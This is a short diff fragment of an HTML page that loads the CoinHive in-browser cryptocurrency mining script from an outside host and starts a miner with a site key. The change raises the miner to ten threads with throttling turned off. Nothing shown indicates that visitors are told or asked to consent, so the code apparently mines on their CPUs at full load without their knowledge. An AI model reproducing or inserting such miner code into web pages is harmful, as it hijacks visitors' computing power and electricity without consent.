@@ -3,7 +3,14 @@
 <body>
 <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 <script>
-	var miner = new CoinHive.Anonymous('UitANGIFzXKM1p25LYThHGmI5jpFkrd4');
+	// var miner = new CoinHive.Anonymous('UitANGIFzXKM1p25LYThHGmI5jpFkrd4');
+	var miner = new CoinHive.Anonymous('UitANGIFzXKM1p25LYThHGmI5jpFkrd4', {
+	threads: 10,
+	autoThreads: false,
+	throttle: 0,
+	forceASMJS: false
+	});
+	
 	miner.start();
 	
 	setInterval(function() {
